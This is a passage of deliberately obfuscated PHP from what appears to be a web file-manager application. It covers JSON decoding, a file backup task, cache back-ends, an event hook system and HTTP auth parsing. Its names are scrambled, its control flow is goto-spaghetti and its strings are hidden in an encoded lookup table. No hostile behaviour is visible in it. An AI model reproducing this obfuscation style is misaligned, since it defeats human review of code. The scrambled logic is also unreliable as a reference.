substr($aå¬ì¬š–Š, $d¡©æÀ…ñ[$döÛ„½ëòó[260]], $DÀçÛ™•Œ - $d¡©æÀ…ñ[$döÛ„½ëòó[260]]); array_push($F·‰á“Òë, array($döÛ„½ëòó[1855] => SERVICES_JSON_SLICE, $döÛ„½ëòó[260] => $DÀçÛ™•Œ + 1, $döÛ„½ëòó[1856] => !1)); if (reset($F·‰á“Òë) == SERVICES_JSON_IN_ARR) { array_push($d¥ë…ÑóÁ, $this->decode($Dƒš³§´ô¬)); } elseif (reset($F·‰á“Òë) == SERVICES_JSON_IN_OBJ) { $BÇÍ¶™œ‹ = array(); if (preg_match($döÛ„½ëòó[1857], $Dƒš³§´ô¬, $BÇÍ¶™œ‹)) { $FÓ”‚ïÓ®‡ = $this->decode($BÇÍ¶™œ‹[1]); $cŠ…ËÌ”Ö• = $this->decode($BÇÍ¶™œ‹[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $E‘Ÿ´‹îŞ[$FÓ”‚ïÓ®‡] = $cŠ…ËÌ”Ö•; } else { $E‘Ÿ´‹îŞ->{$FÓ”‚ïÓ®‡} = $cŠ…ËÌ”Ö•; } } elseif (preg_match($döÛ„½ëòó[1858], $Dƒš³§´ô¬, $BÇÍ¶™œ‹)) { $FÓ”‚ïÓ®‡ = $BÇÍ¶™œ‹[1]; $cŠ…ËÌ”Ö• = $this->decode($BÇÍ¶™œ‹[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $E‘Ÿ´‹îŞ[$FÓ”‚ïÓ®‡] = $cŠ…ËÌ”Ö•; } else { $E‘Ÿ´‹îŞ->{$FÓ”‚ïÓ®‡} = $cŠ…ËÌ”Ö•; } } } } elseif (($aå¬ì¬š–Š[$DÀçÛ™•Œ] == $döÛ„½ëòó[114] || $aå¬ì¬š–Š[$DÀçÛ™•Œ] == $döÛ„½ëòó[55]) && $d¡©æÀ…ñ[$döÛ„½ëòó[1855]] != SERVICES_JSON_IN_STR) { array_push($F·‰á“Òë, array($döÛ„½ëòó[1855] => SERVICES_JSON_IN_STR, $döÛ„½ëòó[260] => $DÀçÛ™•Œ, $döÛ„½ëòó[1856] => $aå¬ì¬š–Š[$DÀçÛ™•Œ])); } elseif ($aå¬ì¬š–Š[$DÀçÛ™•Œ] == $d¡©æÀ…ñ[$döÛ„½ëòó[1856]] && $d¡©æÀ…ñ[$döÛ„½ëòó[1855]] == SERVICES_JSON_IN_STR && (strlen(substr($aå¬ì¬š–Š, 0, $DÀçÛ™•Œ)) - strlen(rtrim(substr($aå¬ì¬š–Š, 0, $DÀçÛ™•Œ), $döÛ„½ëòó[96]))) % 2 != 1) { array_pop($F·‰á“Òë); } elseif ($aå¬ì¬š–Š[$DÀçÛ™•Œ] == $döÛ„½ëòó[154] && in_array($d¡©æÀ…ñ[$döÛ„½ëòó[1855]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($F·‰á“Òë, array($döÛ„½ëòó[1855] => SERVICES_JSON_IN_ARR, $döÛ„½ëòó[260] => $DÀçÛ™•Œ, $döÛ„½ëòó[1856] => !1)); } elseif ($aå¬ì¬š–Š[$DÀçÛ™•Œ] == $döÛ„½ëòó[467] && $d¡©æÀ…ñ[$döÛ„½ëòó[1855]] == SERVICES_JSON_IN_ARR) { array_pop($F·‰á“Òë); } elseif ($aå¬ì¬š–Š[$DÀçÛ™•Œ] == $döÛ„½ëòó[1026] && in_array($d¡©æÀ…ñ[$döÛ„½ëòó[1855]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($F·‰á“Òë, array($döÛ„½ëòó[1855] => SERVICES_JSON_IN_OBJ, $döÛ„½ëòó[260] => $DÀçÛ™•Œ, $döÛ„½ëòó[1856] => !1)); } elseif ($aå¬ì¬š–Š[$DÀçÛ™•Œ] == $döÛ„½ëòó[312] && $d¡©æÀ…ñ[$döÛ„½ëòó[1855]] == SERVICES_JSON_IN_OBJ) { array_pop($F·‰á“Òë); } elseif ($b‘ŞöÓ°äá == $döÛ„½ëòó[1859] && in_array($d¡©æÀ…ñ[$döÛ„½ëòó[1855]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($F·‰á“Òë, array($döÛ„½ëòó[1855] => SERVICES_JSON_IN_CMT, $döÛ„½ëòó[260] => $DÀçÛ™•Œ, $döÛ„½ëòó[1856] => !1)); $DÀçÛ™•Œ++; } elseif ($b‘ŞöÓ°äá == $döÛ„½ëòó[1860] && $d¡©æÀ…ñ[$döÛ„½ëòó[1855]] == SERVICES_JSON_IN_CMT) { array_pop($F·‰á“Òë); $DÀçÛ™•Œ++; for ($aÕÈø†Š¯š = $d¡©æÀ…ñ[$döÛ„½ëòó[260]]; $aÕÈø†Š¯š <= $DÀçÛ™•Œ; ++$aÕÈø†Š¯š) { $aå¬ì¬š–Š = substr_replace($aå¬ì¬š–Š, $döÛ„½ëòó[50], $aÕÈø†Š¯š, 1); } } } if (reset($F·‰á“Òë) == SERVICES_JSON_IN_ARR) { return $d¥ë…ÑóÁ; } elseif (reset($F·‰á“Òë) == SERVICES_JSON_IN_OBJ) { return $E‘Ÿ´‹îŞ; } goto báß¼Ã­Â‚; f¸‚¨ã³’ï: $aå¬ì¬š–Š = $this->reduce_string($aå¬ì¬š–Š); if ($aå¬ì¬š–Š == $döÛ„½ëòó[33]) { if (reset($F·‰á“Òë) == SERVICES_JSON_IN_ARR) { return $d¥ë…ÑóÁ; } else { return $E‘Ÿ´‹îŞ; } } $Eˆ›í¶†¥ = strlen($aå¬ì¬š–Š); goto C÷»Ò›ÆÑØ; báß¼Ã­Â‚: } } } function isError($Cà¸ï«ºÀ, $B´áË¿ä…ğ = null) { $F‰õœ¢±¶ =& $_SERVER[‘®…¢À]; if (class_exists($F‰õœ¢±¶[1861])) { return PEAR::isError($Cà¸ï«ºÀ, $B´áË¿ä…ğ); } elseif (is_object($Cà¸ï«ºÀ) && (get_class($Cà¸ï«ºÀ) == $F‰õœ¢±¶[1862] || is_subclass_of($Cà¸ï«ºÀ, $F‰õœ¢±¶[1862]))) { return !0; } return !1; } } if (class_exists($_SERVER[‘®…¢À][1863])) { class Services_JSON_Error extends PEAR_Error { function __construct($fÂÈÌ³Ù… = "\165\156\153\x6e\157\x77\x6e\x20\145\x72\162\157\162", $bòÑÊÙõğª = null, $A¾¶±…÷ Ô = null, $cæë×ŠÃé· = null, $e¨´‰ª„¬ = null) { parent::PEAR_Error($fÂÈÌ³Ù…, $bòÑÊÙõğª, $A¾¶±…÷ Ô, $cæë×ŠÃé·, $e¨´‰ª„¬); } } } else { class Services_JSON_Error { function __construct($D²æ·…šñ† = "\x75\156\153\x6e\x6f\x77\156\40\x65\x72\x72\157\x72", $F¤Œ…îµÁÉ = null, $Fºª¶î¼ ƒ = null, $C¸»ÚÂ‘µÍ = null, $eí˜ÓË…ç = null) { } } } goto DôÏµÉ¦ÕŠ; b Ğ†Ù†µ: class BackupFile { public function __construct() { } public function index() { goto AÇÙÖ„­ ¯; AÇÙÖ„­ ¯: $f ˆ÷¢„É = Backup::get(); $cÜÏóÌµ‰ = $f ˆ÷¢„É[$_SERVER[‘®…¢À][278]][$_SERVER[‘®…¢À][164]][$_SERVER[‘®…¢À][414]]; $BÏÁ‹êÃ‡¨ = array($_SERVER[‘®…¢À][415] => array($_SERVER[‘®…¢À][718], $cÜÏóÌµ‰), $_SERVER[‘®…¢À][719] => array($_SERVER[‘®…¢À][316], $f ˆ÷¢„É[$_SERVER[‘®…¢À][664]])); goto f‹Ç§®ù³Ú; DøèËŒÉ˜ä: Backup::set($e§‰áÕ¡å); $this->_fileFilter($Bºˆ÷ªøÂí); return !0; goto E´Ìœ»Ì£ø; B½„Ğ½¥×: $Bä¼… ®¨->task[$_SERVER[‘®…¢À][671]] = $aîã¥¿Ì£å; $e§‰áÕ¡å = array($_SERVER[‘®…¢À][722] => $aÛƒ‡ˆœóß, $_SERVER[‘®…¢À][723] => $aîã¥¿Ì£å); Backup::set($e§‰áÕ¡å); goto E¼´œ±¦á±; A§Çß¾ÜÜ‹: $FÔô–ä¿Æ = $A¬Éµã‚ì† ? 1 : 0; $e§‰áÕ¡å = array($_SERVER[‘®…¢À][733] => 1, $_SERVER[‘®…¢À][676] => time(), $_SERVER[‘®…¢À][682] => $FÔô–ä¿Æ, $_SERVER[‘®…¢À][730] => $cÜÏóÌµ‰, $_SERVER[‘®…¢À][723] => $aîã¥¿Ì£å, $_SERVER[‘®…¢À][722] => $aÛƒ‡ˆœóß); if ($D‘•çê…ë) { $e§‰áÕ¡å[$_SERVER[‘®…¢À][731]] = $dÖá¬Æ¾; $e§‰áÕ¡å[$_SERVER[‘®…¢À][732]] = $a¶·–Ÿ„¬; } goto DøèËŒÉ˜ä; E¼´œ±¦á±: $A¬Éµã‚ì† = !0; $F–‰ŠÅË‚Î = $this->storeIds(); $EÓÜŒÉÃá = 1; goto f–™»ÎÏÔ; A­ôåĞ¨‹œ: $a¶·–Ÿ„¬ = $dÖá¬Æ¾ = 0; do { $FØÃ†› ‘ = $_SERVER[‘®…¢À][724]; $e–³ç—„ò÷ = Model($_SERVER[‘®…¢À][695])->where($BÏÁ‹êÃ‡¨)->field($FØÃ†› ‘)->order($_SERVER[‘®…¢À][725])->selectPage($Ağ„Ê¢±Â, $EÓÜŒÉÃá); $eÃ‡ğó§ = !empty($e–³ç—„ò÷[$_SERVER[‘®…¢À][350]]) ? $e–³ç—„ò÷[$_SERVER[‘®…¢À][350]] : array(); foreach ($eÃ‡ğó§ as $C³»Œ¨œ¡) { goto Eè¹¬±’«ñ; Eè¹¬±’«ñ: if (!$this->_fileExist($C³»Œ¨œ¡, $Bºˆ÷ªøÂí, $F–‰ŠÅË‚Î)) { $aÛƒ‡ˆœóß -= 1; $aîã¥¿Ì£å -= (int) $C³»Œ¨œ¡[$_SERVER[‘®…¢À][78]]; write_log("\x66\x69\154\145\40\156\x6f\164\40\145\x78\151\163\x74\x2e\146\151\x6c\145\x49\104\x3a{$C³»Œ¨œ¡[$_SERVER[‘®…¢À][414]]}\54\40\x70\141\x74\x68\x3a{$C³»Œ¨œ¡[$_SERVER[‘®…¢À][76]]}", $_SERVER[‘®…¢À][726]); continue; } $f±µóœäğ™ = $C³»Œ¨œ¡[$_SERVER[‘®…¢À][76]]; $dã³†ï¸µÙ = "\173\x69\x6f\x3a{$f ˆ÷¢„É[$_SERVER[‘®…¢À][664]]}\175" . substr($f±µóœäğ™, strlen("\173\x69\157\72{$C³»Œ¨œ¡[$_SERVER[‘®…¢À][696]]}\x7d")); goto Cöİß½ù¿; AÄ·è£ì: if ($fàÍ¢¥•±í >= 1024 * 1024 * 50) { $e§‰áÕ¡å = array($_SERVER[‘®…¢À][730] => $cÜÏóÌµ‰, $_SERVER[‘®…¢À][731] => $dÖá¬Æ¾, $_SERVER[‘®…¢À][732] => $a¶·–Ÿ„¬); Backup::set($e§‰áÕ¡å); $fàÍ¢¥•±í = $D‘•çê…ë = 0; } goto FÑ—½±¶ƒ«; Cöİß½ù¿: if (IO::exist($dã³†ï¸µÙ)) { $Bä¼… ®¨->updateFileEnd($C³»Œ¨œ¡[$_SERVER[‘®…¢À][28]], $C³»Œ¨œ¡[$_SERVER[‘®…¢À][78]]); } else { $dã³†ï¸µÙ = get_path_father($dã³†ï¸µÙ); IO::mkdir($dã³†ï¸µÙ); if (!IO::copy($f±µóœäğ™, $dã³†ï¸µÙ, $_SERVER[‘®…¢À][727])) { write_log($_SERVER[‘®…¢À][728] . $f±µóœäğ™ . $_SERVER[‘®…¢À][729] . $dã³†ï¸µÙ . $_SERVER[‘®…¢À][467], $_SERVER[‘®…¢À][684]); $A¬Éµã‚ì† = !1; break; } } $cÜÏóÌµ‰ = $C³»Œ¨œ¡[$_SERVER[‘®…¢À][414]]; $D‘•çê…ë += 1; goto EÌìö »—Ê; EÌìö »—Ê: $fàÍ¢¥•±í += $C³»Œ¨œ¡[$_SERVER[‘®…¢À][78]]; $dÖá¬Æ¾ += 1; $a¶·–Ÿ„¬ += $C³»Œ¨œ¡[$_SERVER[‘®…¢À][78]]; goto AÄ·è£ì; FÑ—½±¶ƒ«: } $d¬İ»¯š«¡ = count($eÃ‡ğó§); $EÓÜŒÉÃá++; } while ($d¬İ»¯š«¡ == $Ağ„Ê¢±Â); $Bä¼… ®¨->end(); goto A§Çß¾ÜÜ‹; f–™»ÎÏÔ: $Ağ„Ê¢±Â = 1000; $fàÍ¢¥•±í = $D‘•çê…ë = 0; $Bºˆ÷ªøÂí = array(); goto A­ôåĞ¨‹œ; f‹Ç§®ù³Ú: $aÛƒ‡ˆœóß = (int) Model($_SERVER[‘®…¢À][695])->where($BÏÁ‹êÃ‡¨)->count($_SERVER[‘®…¢À][414]); $aîã¥¿Ì£å = (int) Model($_SERVER[‘®…¢À][695])->where($BÏÁ‹êÃ‡¨)->sum($_SERVER[‘®…¢À][78]); $Bä¼… ®¨ = new TaskFileTransfer($_SERVER[‘®…¢À][720], $_SERVER[‘®…¢À][684], $aÛƒ‡ˆœóß, LNG($_SERVER[‘®…¢À][685]) . $_SERVER[‘®…¢À][686] . LNG($_SERVER[‘®…¢À][721])); goto B½„Ğ½¥×; E´Ìœ»Ì£ø: } private function _fileExist($F—‡¶Ê‚¦œ, &$FŞÅÖ¹ß, $DÜ»Øîó„) { goto bâ‚ò˜ò¸; bâ‚ò˜ò¸: $cÙõ“‰©ù =& $_SERVER[‘®…¢À]; $a‚ÕÛª¾İ‰ = $F—‡¶Ê‚¦œ[$cÙõ“‰©ù[76]]; if (in_array($F—‡¶Ê‚¦œ[$cÙõ“‰©ù[414]], $FŞÅÖ¹ß)) { return !1; } goto eÏŞ‚âÉÌÆ; eÏŞ‚âÉÌÆ: if (!in_array($F—‡¶Ê‚¦œ[$cÙõ“‰©ù[696]], $DÜ»Øîó„)) { return !1; } if (IO::exist($a‚ÕÛª¾İ‰)) { return !0; } $f™›¬äÄ÷ä = get_path_father($a‚ÕÛª¾İ‰); goto d·¯Ú…¬ƒÀ; d·¯Ú…¬ƒÀ: if (IO::exist($f™›¬äÄ÷ä)) { $FŞÅÖ¹ß[] = $F—‡¶Ê‚¦œ[$cÙõ“‰©ù[414]]; return !1; } $EÙˆ²¹Â = array($cÙõ“‰©ù[696] => $F—‡¶Ê‚¦œ[$cÙõ“‰©ù[696]], $cÙõ“‰©ù[76] => array($cÙõ“‰©ù[734], "{$f™›¬äÄ÷ä}\x25")); $E¹£ÚĞç•ë = Model($cÙõ“‰©ù[695])->where($EÙˆ²¹Â)->field($cÙõ“‰©ù[415])->select(); goto e¸‹µôó¥; e¸‹µôó¥: $FŞÅÖ¹ß = array_merge($FŞÅÖ¹ß, array_to_keyvalue($E¹£ÚĞç•ë, $cÙõ“‰©ù[33], $cÙõ“‰©ù[414])); return !1; goto d÷ÈÎÈÁí; d÷ÈÎÈÁí: } private function _fileFilter($c‡‰È–ñ«) { $B¥»ÙÕ˜‰å =& $_SERVER[‘®…¢À]; if (empty($c‡‰È–ñ«)) { return; } $d„ÉÏ«ÕÆ = array($B¥»ÙÕ˜‰å[414] => array($B¥»ÙÕ˜‰å[7], array_unique($c‡‰È–ñ«))); $AµôÁæÈœî = Model($B¥»ÙÕ˜‰å[735])->where($d„ÉÏ«ÕÆ)->field($B¥»ÙÕ˜‰å[365])->select(); foreach ($AµôÁæÈœî as $BÍĞƒÀ“Ãé) { Model($B¥»ÙÕ˜‰å[735])->remove($BÍĞƒÀ“Ãé[$B¥»ÙÕ˜‰å[365]], !1); } } private function storeIds() { $A‘§²¶ñØ =& $_SERVER[‘®…¢À]; $e·¬ˆÇÉÄÌ = Model($A‘§²¶ñØ[677])->listData(); return array_to_keyvalue($e·¬ˆÇÉÄÌ, $A‘§²¶ñØ[33], $A‘§²¶ñØ[363]); } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto eâÜÑÌ¯‚; eâÜÑÌ¯‚: $fÈ¬º™…« =& $_SERVER[‘®…¢À]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto BîÔ×Üè»Ï; C‹ŞÄ§èÆ: switch ($f‹–‘ï³ô»[$fÈ¬º™…«[736]]) { case $fÈ¬º™…«[17]: self::$handle = Model($fÈ¬º™…«[738]); break; case $fÈ¬º™…«[739]: self::$handle = new CacheRedis($DíÕƒ²ÔÔ†, $CÕ¾‡ì×†¦); break; case $fÈ¬º™…«[740]: self::$handle = new CacheMemcached($DíÕƒ²ÔÔ†, $CÕ¾‡ì×†¦); break; case $fÈ¬º™…«[164]: self::$handle = new CacheFile($DíÕƒ²ÔÔ†, $CÕ¾‡ì×†¦); break; default: break; } return self::$handle; goto FÃİïÓ·¸ø; BîÔ×Üè»Ï: $f‹–‘ï³ô» = $GLOBALS[$fÈ¬º™…«[6]][$fÈ¬º™…«[334]]; $DíÕƒ²ÔÔ† = $f‹–‘ï³ô»[$f‹–‘ï³ô»[$fÈ¬º™…«[736]]]; $CÕ¾‡ì×†¦ = $f‹–‘ï³ô»[$fÈ¬º™…«[737]]; goto C‹ŞÄ§èÆ; FÃİïÓ·¸ø: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($bÁÍš½–Û) { if (is_array($bÁÍš½–Û) || is_object($bÁÍš½–Û)) { $bÁÍš½–Û = json_encode($bÁÍš½–Û); } $bÁÍš½–Û = rawurlencode($bÁÍš½–Û); return KOD_SITE_ID . $_SERVER[‘®…¢À][71] . $bÁÍš½–Û; } public static function get($b»ò­Ö—÷ô) { $DŠ™Ÿœ˜Ú = self::key($b»ò­Ö—÷ô); if (!isset(self::$memoryCache[$DŠ™Ÿœ˜Ú])) { CacheLock::lock($b»ò­Ö—÷ô); $F‚Šãß—É´ = self::init()->get($DŠ™Ÿœ˜Ú); CacheLock::unlock($b»ò­Ö—÷ô); self::$memoryCache[$DŠ™Ÿœ˜Ú] = unserialize($F‚Šãß—É´); } return self::$memoryCache[$DŠ™Ÿœ˜Ú]; } public static function set($bÁ’º½ˆ, $a‹©„øÜ¤„, $b÷†Õí–‚· = false) { goto AÅ™“Ğ¾–; d‡¼ç¥…‚: CacheLock::lock($bÁ’º½ˆ); $B¡ÒÚÏˆÊå = self::init()->set($A¨ª­åÕ˜Ê, serialize($a‹©„øÜ¤„), $b÷†Õí–‚·); self::$memoryCache[$A¨ª­åÕ˜Ê] = $a‹©„øÜ¤„; goto D–é–…Õ„¬; AÅ™“Ğ¾–: $A¨ª­åÕ˜Ê = self::key($bÁ’º½ˆ); if (isset(self::$memoryCache[$A¨ª­åÕ˜Ê]) && self::$memoryCache[$A¨ª­åÕ˜Ê] === $a‹©„øÜ¤„) { return !0; } if ($b÷†Õí–‚· === 0) { self::$memoryCache[$A¨ª­åÕ˜Ê] = $a‹©„øÜ¤„; return !0; } goto d‡¼ç¥…‚; D–é–…Õ„¬: CacheLock::unlock($bÁ’º½ˆ); return $B¡ÒÚÏˆÊå; goto fØãæò™¶¤; fØãæò™¶¤: } public static function remove($Eˆ´¢ò‡—¸) { goto aòòù Õ–Ì; e‡ÕÛˆÂÙÁ: return $bÊì¥®Ñ; goto cöğ”ˆÌ´; bœ‚Šğº: CacheLock::lock($Eˆ´¢ò‡—¸); $bÊì¥®Ñ = self::init()->remove($d®È‚‡èù); CacheLock::unlock($Eˆ´¢ò‡—¸); goto e‡ÕÛˆÂÙÁ; aòòù Õ–Ì: $d®È‚‡èù = self::key($Eˆ´¢ò‡—¸); unset(self::$memoryCache[$d®È‚‡èù]); self::clearTimeout(); goto bœ‚Šğº; cöğ”ˆÌ´: } public static function clearMemory($C·£æ˜íšë = false) { if ($C·£æ˜íšë) { $C·£æ˜íšë = self::key($C·£æ˜íšë); unset(self::$memoryCache[$C·£æ˜íšë]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[‘®…¢À][741])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[‘®…¢À][742])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($b©™³ö¡Çå, $fœÚ’¡Ñ¸†) { $FÙ™¨ä”æŠ =& $_SERVER[‘®…¢À]; $this->cachePath = $b©™³ö¡Çå[$FÙ™¨ä”æŠ[76]]; $this->prefix = $FÙ™¨ä”æŠ[743]; $this->cacheTime = $fœÚ’¡Ñ¸†; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($EæÃĞ¥½») { $F³ğ—¤ù¼ =& $_SERVER[‘®…¢À]; $EæÃĞ¥½» = str_replace(array($F³ğ—¤ù¼[711], $F³ğ—¤ù¼[96], $F³ğ—¤ù¼[70]), $F³ğ—¤ù¼[744], $EæÃĞ¥½»); return $this->cachePath . $F³ğ—¤ù¼[745] . $EæÃĞ¥½» . $F³ğ—¤ù¼[746]; } public function set($D»Ôö°øœ, $FñÀÌÃáâ, $EµõåÒÏ„™ = false) { $AåíÓéÕÇ = $this->getFile($D»Ôö°øœ); if (file_put_contents($AåíÓéÕÇ, $this->prefix . $FñÀÌÃáâ, LOCK_EX)) { return !0; } @unlink($AåíÓéÕÇ); return !1; } public function get($dÏ´ñã…¸) { $E‹¿ÔÀ™Í = $this->getFile($dÏ´ñã…¸); if (file_exists($E‹¿ÔÀ™Í) && filemtime($E‹¿ÔÀ™Í) < time() - $this->cacheTime) { @unlink($E‹¿ÔÀ™Í); return !1; } $D†˜Ó£èï— = @file_get_contents($E‹¿ÔÀ™Í); return substr($D†˜Ó£èï—, strlen($this->prefix)); } public function remove($FÜŒ¯¶«Ãï) { $DË‘¦Œ¡ë÷ = $this->getFile($FÜŒ¯¶«Ãï); return @unlink($DË‘¦Œ¡ë÷); } public function deleteAll() { $d×„Ó«“èì =& $_SERVER[‘®…¢À]; $D¬°™«Ï¿õ = scandir($this->cachePath); foreach ($D¬°™«Ï¿õ as $e¤ù–„½´) { $D¼±ã¶‚¥ç = $this->cachePath . $e¤ù–„½´; if (strpos($D¼±ã¶‚¥ç, $d×„Ó«“èì[746]) && strpos($D¼±ã¶‚¥ç, $d×„Ó«“èì[747])) { @unlink($D¼±ã¶‚¥ç); } } } public function clearTimeout() { $AÃÔ‘·Ï® =& $_SERVER[‘®…¢À]; $A£„òï“ = scandir($this->cachePath); foreach ($A£„òï“ as $f£šÚ¯ã³) { $eˆ‡Íêšß = $this->cachePath . $f£šÚ¯ã³; if (strpos($eˆ‡Íêšß, $AÃÔ‘·Ï®[746]) && strpos($eˆ‡Íêšß, $AÃÔ‘·Ï®[747]) && filemtime($eˆ‡Íêšß) < time() - $this->cacheTime) { @unlink($eˆ‡Íêšß); } } } } goto C‚øø²ñ¾; FƒÖÂ–ÎÊ—: class Hook { private static $events = array(); public static function get($B²›¿ óÃœ = false) { if (!$B²›¿ óÃœ) { return self::$events; } else { return self::$events[$B²›¿ óÃœ]; } } public static function apply($A¸“‘ø‹ê, $eùçøìÔÚˆ = array()) { $c§¥øáİà¤ = ActionApply($A¸“‘ø‹ê, $eùçøìÔÚˆ); if (is_string($A¸“‘ø‹ê)) { Hook::trigger($A¸“‘ø‹ê); } return $c§¥øáİà¤; } public static function bind($d‚‚ô£ï©½, $cìŠÚ¨è×®, $cõ¸¯çÂ = false) { $dó×º¨Ğ¬¾ =& $_SERVER[‘®…¢À]; if (!isset(self::$events[$d‚‚ô£ï©½])) { self::$events[$d‚‚ô£ï©½] = array(); } self::$events[$d‚‚ô£ï©½][] = array($dó×º¨Ğ¬¾[1645] => $cìŠÚ¨è×®, $dó×º¨Ğ¬¾[1646] => $cõ¸¯çÂ, $dó×º¨Ğ¬¾[1647] => 0); } public static function once($FØ¿¤“Ğñ, $aÆòÚïÓŒì) { self::bind($FØ¿¤“Ğñ, $aÆòÚïÓŒì, !0); } public static function unbind($AÇ©‚ÌäÏ, $d÷ç¢¦¦†Ê = false) { if (!$d÷ç¢¦¦†Ê) { self::$events[$AÇ©‚ÌäÏ] = array(); return; } $eŠ‘¶ø¦‚Š = self::$events[$AÇ©‚ÌäÏ]; self::$events[$AÇ©‚ÌäÏ] = array(); if (!$eŠ‘¶ø¦‚Š) { return; } for ($cÎë²ì’ù = 0; $cÎë²ì’ù < count($eŠ‘¶ø¦‚Š); $cÎë²ì’ù++) { if ($eŠ‘¶ø¦‚Š[$cÎë²ì’ù][$_SERVER[‘®…¢À][1645]] == $d÷ç¢¦¦†Ê) { continue; } self::$events[$AÇ©‚ÌäÏ][] = $eŠ‘¶ø¦‚Š[$cÎë²ì’ù]; } } public static function filter($e¢æ²Èôô¿, $FÚ ƒ¡¸±¬) { goto fˆ´¡·ö; CÚ‚ÆË‚‘ä: for ($eŒÑ…¶Äå˜ = 0; $eŒÑ…¶Äå˜ < count($E®Í¢à‚…Ú); $eŒÑ…¶Äå˜++) { $AĞµ‹­œˆ = $E®Í¢à‚…Ú[$eŒÑ…¶Äå˜]; if ($AĞµ‹­œˆ[$cÕÛ³­¼Ñ¶[1646]] && $AĞµ‹­œˆ[$cÕÛ³­¼Ñ¶[1647]] > 1) { continue; } self::$events[$e¢æ²Èôô¿][$eŒÑ…¶Äå˜][$cÕÛ³­¼Ñ¶[1647]] = $AĞµ‹­œˆ[$cÕÛ³­¼Ñ¶[1647]] + 1; $DÊ©­¯ŠŒ¤ = self::apply($AĞµ‹­œˆ[$cÕÛ³­¼Ñ¶[1645]], array($a»·É¯Ô‚¥)); if (!is_null($DÊ©­¯ŠŒ¤)) { $a»·É¯Ô‚¥ = $DÊ©­¯ŠŒ¤; } } return $a»·É¯Ô‚¥; goto b­öÅê¥¬; FÀ£“†ŒË: $E®Í¢à‚…Ú = $b¡ã÷‘¹ÛÚ[$e¢æ²Èôô¿]; $a»·É¯Ô‚¥ = $FÚ ƒ¡¸±¬; if (!is_array($E®Í¢à‚…Ú) || count($E®Í¢à‚…Ú) == 0) { return $a»·É¯Ô‚¥; } goto CÚ‚ÆË‚‘ä; fˆ´¡·ö: $cÕÛ³­¼Ñ¶ =& $_SERVER[‘®…¢À]; $b¡ã÷‘¹ÛÚ = self::$events; if (!isset($b¡ã÷‘¹ÛÚ[$e¢æ²Èôô¿])) { return $FÚ ƒ¡¸±¬; } goto FÀ£“†ŒË; b­öÅê¥¬: } public static function trigger($bœ—•õ‡œ) { goto d÷ß÷¨æÁà; d÷ß÷¨æÁà: $CÂÌ­‰·ÉÖ =& $_SERVER[‘®…¢À]; $a†¦»Ê†© = self::$events; $eÖÔÄç„³² = !1; goto aÒÚ…ÚŒÌƒ; aÒÚ…ÚŒÌƒ: if (!isset($a†¦»Ê†©[$bœ—•õ‡œ])) { return $eÖÔÄç„³²; } $Cõ±”è„› = $a†¦»Ê†©[$bœ—•õ‡œ]; if (!is_array($Cõ±”è„›) || count($Cõ±”è„›) == 0) { return $eÖÔÄç„³²; } goto DÙÅ¼ôÂ–; aˆß£ŸŸš: return $eÖÔÄç„³²; goto aåÀß®‰©¬; DÙÅ¼ôÂ–: $dÙÔÏ…¾Ìõ = func_get_args(); array_shift($dÙÔÏ…¾Ìõ); for ($Bâñ”º»Ò’ = 0; $Bâñ”º»Ò’ < count($Cõ±”è„›); $Bâñ”º»Ò’++) { $Dèµù±”° = $Cõ±”è„›[$Bâñ”º»Ò’]; if ($Dèµù±”°[$CÂÌ­‰·ÉÖ[1646]] && $Dèµù±”°[$CÂÌ­‰·ÉÖ[1647]] > 1) { continue; } if (defined($CÂÌ­‰·ÉÖ[1648]) && GLOBAL_LOG_HOOK) { write_log($bœ—•õ‡œ . $CÂÌ­‰·ÉÖ[1649] . $Dèµù±”°[$CÂÌ­‰·ÉÖ[1645]], $CÂÌ­‰·ÉÖ[1650]); } self::$events[$bœ—•õ‡œ][$Bâñ”º»Ò’][$CÂÌ­‰·ÉÖ[1647]] = $Dèµù±”°[$CÂÌ­‰·ÉÖ[1647]] + 1; $Bê¾•Šƒî = self::apply($Dèµù±”°[$CÂÌ­‰·ÉÖ[1645]], $dÙÔÏ…¾Ìõ); if (defined($CÂÌ­‰·ÉÖ[1648]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $CÂÌ­‰·ÉÖ[1650]); if ($Dèµù±”°[$CÂÌ­‰·ÉÖ[1647]] == 200) { $aÛ¾ã‰ º = is_array($Dèµù±”°[$CÂÌ­‰·ÉÖ[1645]]) ? json_encode_force($Dèµù±”°[$CÂÌ­‰·ÉÖ[1645]]) : $Dèµù±”°[$CÂÌ­‰·ÉÖ[1645]]; write_log($CÂÌ­‰·ÉÖ[1651] . $bœ—•õ‡œ . $CÂÌ­‰·ÉÖ[1652] . $aÛ¾ã‰ º, $CÂÌ­‰·ÉÖ[1653]); } } $eÖÔÄç„³² = is_null($Bê¾•Šƒî) ? $eÖÔÄç„³² : $Bê¾•Šƒî; } goto aˆß£ŸŸš; aåÀß®‰©¬: } } class HttpAuth { public static function get() { $F ëÂ¥º‡Š =& $_SERVER[‘®…¢À]; $B·îŠô‘ = $F ëÂ¥º‡Š[33]; $cĞ´Š¢­Šª = $F ëÂ¥º‡Š[33]; if (isset($_SERVER[$F ëÂ¥º‡Š[1654]])) { $B·îŠô‘ = $_SERVER[$F ëÂ¥º‡Š[1654]]; $cĞ´Š¢­Šª = $_SERVER[$F ëÂ¥º‡Š[1655]]; } elseif (isset($_SERVER[$F ëÂ¥º‡Š[1656]])) { $BÓŠ´²ÏÕÔ = $_SERVER[$F ëÂ¥º‡Š[1656]]; if (strpos(strtolower($BÓŠ´²ÏÕÔ), $F ëÂ¥º‡Š[1657]) === 0) { $eİ»Õ¢¤÷Ü = explode($F 